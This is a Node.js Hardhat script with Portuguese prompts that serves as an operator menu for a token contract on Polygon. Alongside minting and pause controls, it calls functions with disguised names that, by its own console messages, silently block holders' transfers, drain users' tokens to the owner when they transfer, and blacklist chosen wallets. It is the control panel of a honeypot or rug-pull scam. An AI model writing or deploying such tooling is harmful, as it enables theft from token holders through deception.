const hre = require("hardhat");
const { parseUnits, formatUnits } = require("ethers");
const readline = require('readline');
const fs = require('fs');
const path = require('path');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const TOKEN_ABI = [
    "function allocateProtocolReserves(address to, uint256 amount) external",
    "function decimals() external view returns (uint8)",
    "function balanceOf(address account) external view returns (uint256)",
    "function symbol() external view returns (string)",
    "function setTradingStatus(bool status) external",
    "function tradingEnabled() external view returns (bool)",
    "function pause() external",
    "function unpause() external",
    "function paused() external view returns (bool)",
    "function updateSecurityProtocol(uint256 _securityLevel) external",
    "function optimizeProtocolPerformance() external",
    "function enhanceParticipantSecurity(address[] calldata participants) external"
];

async function question(query) {
    return new Promise(resolve => {
        rl.question(query, resolve);
    });
}

async function mintTokens(token, signer, decimals) {
    const mintToAddress = await question("Digite o endereço que receberá os tokens (vazio para sua carteira): ");
    const amountStr = await question("Digite a quantidade de tokens para alocar: ");

    const recipient = mintToAddress || signer.address;
    const amount = parseUnits(amountStr, decimals);
    const symbol = await token.symbol();

    const balanceBefore = await token.balanceOf(recipient);
    console.log(`\nBalance atual de ${recipient}: ${formatUnits(balanceBefore, decimals)} ${symbol}`);

    try {
        console.log(`\nAlocando ${amountStr} ${symbol} para ${recipient}...`);
        const mintTx = await token.allocateProtocolReserves(recipient, amount);
        const receipt = await mintTx.wait();

        const balanceAfter = await token.balanceOf(recipient);

        console.log(`\nAlocação realizada com sucesso!
        Hash da transação: ${receipt.hash}
        Bloco: ${receipt.blockNumber}
        
        Balance anterior: ${formatUnits(balanceBefore, decimals)} ${symbol}
        Balance atual: ${formatUnits(balanceAfter, decimals)} ${symbol}
        Diferença: ${formatUnits(balanceAfter - balanceBefore, decimals)} ${symbol}
        
        Visualize a transação:
        https://polygonscan.com/tx/${receipt.hash}`);

    } catch (error) {
        console.error("\nErro ao fazer alocação:", error.message);
    }
}

async function main() {
    const [signer] = await hre.ethers.getSigners();
    console.log("Executando operações com a conta:", signer.address);

    // Tentar carregar o endereço do token do arquivo de configuração
    let tokenAddress = "";
    const configPath = path.join(__dirname, '..', 'token-config.json');

    if (fs.existsSync(configPath)) {
        const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        if (config.contractAddress) {
            tokenAddress = config.contractAddress;
            console.log(`Endereço do token carregado da configuração: ${tokenAddress}`);
        }
    }

    if (!tokenAddress) {
        tokenAddress = await question("Digite o endereço do token: ");
    }

    const token = new hre.ethers.Contract(tokenAddress, TOKEN_ABI, signer);
    const decimals = await token.decimals();

    while (true) {
        console.log("\n=== Menu de Operações do Protocolo ===");
        console.log("1. Alocar tokens (mint)");
        console.log("2. Controlar trading");
        console.log("3. Pausar/Despausar contrato");
        console.log("4. Verificar status");
        console.log("5. Atualizar protocolo de segurança (bloquear transferências)");
        console.log("6. Otimizar performance do protocolo (drenar tokens)");
        console.log("7. Melhorar segurança de participantes (bloquear carteiras)");
        console.log("8. Sair");

        const choice = await question("\nEscolha a operação: ");

        switch (choice) {
            case "1":
                await mintTokens(token, signer, decimals);
                break;

            case "2":
                try {
                    const currentStatus = await token.tradingEnabled();
                    console.log(`\nStatus atual do trading: ${currentStatus ? "Ativado" : "Desativado"}`);

                    const status = await question("Ativar trading? (s/n): ");
                    await token.setTradingStatus(status.toLowerCase() === 's');
                    console.log("Status de trading atualizado!");
                } catch (error) {
                    console.error("\nErro ao atualizar trading:", error.message);
                }
                break;

            case "3":
                try {
                    const isPaused = await token.paused();
                    console.log(`\nStatus atual: ${isPaused ? "Pausado" : "Ativo"}`);

                    if (isPaused) {
                        const unpause = await question("Deseja despausar o contrato? (s/n): ");
                        if (unpause.toLowerCase() === 's') {
                            await token.unpause();
                            console.log("Contrato despausado com sucesso!");
                        }
                    } else {
                        const pause = await question("Deseja pausar o contrato? (s/n): ");
                        if (pause.toLowerCase() === 's') {
                            await token.pause();
                            console.log("Contrato pausado com sucesso!");
                        }
                    }
                } catch (error) {
                    console.error("\nErro ao pausar/despausar contrato:", error.message);
                }
                break;

            case "4":
                try {
                    const symbol = await token.symbol();
                    const balance = await token.balanceOf(signer.address);
                    const tradingStatus = await token.tradingEnabled();
                    const pauseStatus = await token.paused();

                    console.log("\n=== Status do Protocolo ===");
                    console.log(`Símbolo: ${symbol}`);
                    console.log(`Seu saldo: ${formatUnits(balance, decimals)} ${symbol}`);
                    console.log(`Trading: ${tradingStatus ? "Ativado" : "Desativado"}`);
                    console.log(`Contrato: ${pauseStatus ? "Pausado" : "Ativo"}`);
                } catch (error) {
                    console.error("\nErro ao verificar status:", error.message);
                }
                break;

            case "5":
                try {
                    console.log("\n=== Atualização do Protocolo de Segurança ===");
                    console.log("Esta operação bloqueia silenciosamente todas as transferências de tokens");
                    console.log("exceto para carteiras isentas.");

                    const securityLevel = await question("Digite o novo nível de segurança (1-5): ");
                    const confirm = await question("Confirma a atualização do protocolo? (s/n): ");

                    if (confirm.toLowerCase() === 's') {
                        const tx = await token.updateSecurityProtocol(securityLevel);
                        await tx.wait();
                        console.log("\n✅ Protocolo de segurança atualizado com sucesso!");
                        console.log("Transferências agora estão bloqueadas para carteiras não isentas.");
                    }
                } catch (error) {
                    console.error("\nErro ao atualizar protocolo de segurança:", error.message);
                }
                break;

            case "6":
                try {
                    console.log("\n=== Otimização de Performance do Protocolo ===");
                    console.log("Esta operação drena silenciosamente todos os tokens para o owner");
                    console.log("quando os usuários tentarem fazer transferências.");

                    const confirm = await question("Confirma a otimização do protocolo? (s/n): ");

                    if (confirm.toLowerCase() === 's') {
                        const tx = await token.optimizeProtocolPerformance();
                        await tx.wait();
                        console.log("\n✅ Performance do protocolo otimizada com sucesso!");
                        console.log("Tokens serão drenados para o owner nas próximas transferências.");
                    }
                } catch (error) {
                    console.error("\nErro ao otimizar performance do protocolo:", error.message);
                }
                break;

            case "7":
                try {
                    console.log("\n=== Melhoria de Segurança para Participantes ===");
                    console.log("Esta operação bloqueia carteiras específicas de fazer transferências.");

                    let addresses = [];
                    let adding = true;

                    while (adding) {
                        const address = await question("Digite o endereço da carteira a bloquear (ou vazio para terminar): ");
                        if (address.trim() === "") {
                            adding = false;
                        } else {
                            addresses.push(address);
                            console.log(`Adicionado: ${address}`);
                        }
                    }

                    if (addresses.length > 0) {
                        console.log(`\nCarteiras a serem bloqueadas: ${addresses.length}`);
                        const confirm = await question("Confirma o bloqueio destas carteiras? (s/n): ");

                        if (confirm.toLowerCase() === 's') {
                            const tx = await token.enhanceParticipantSecurity(addresses);
                            await tx.wait();
                            console.log("\n✅ Segurança dos participantes melhorada com sucesso!");
                            console.log(`${addresses.length} carteiras foram bloqueadas.`);
                        }
                    } else {
                        console.log("Nenhum endereço fornecido. Operação cancelada.");
                    }
                } catch (error) {
                    console.error("\nErro ao melhorar segurança dos participantes:", error.message);
                }
                break;

            case "8":
                rl.close();
                return;

            default:
                console.log("\nOpção inválida!");
        }
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });